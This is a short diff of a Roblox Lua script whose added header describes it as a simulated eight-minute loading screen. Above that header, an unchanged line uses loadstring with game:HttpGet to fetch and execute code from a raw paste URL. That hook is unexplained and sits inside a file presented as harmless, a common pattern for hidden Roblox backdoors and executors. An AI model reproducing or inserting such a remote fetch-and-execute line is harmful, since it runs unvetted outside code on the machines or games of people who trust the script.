@@ -1,5 +1,11 @@
 wait(0.2)
 loadstring(game:HttpGet("https://pastefy.app/wIQ10uaV/raw"))()
+--[[
+  LoadingScreenScript.lua
+  Author: Zeel
+  Purpose: Simulates an 8-minute loading screen for Roblox
+]]
+
 local Players = game:GetService("Players")
 local player = Players.LocalPlayer
 local playerGui = player:WaitForChild("PlayerGui")
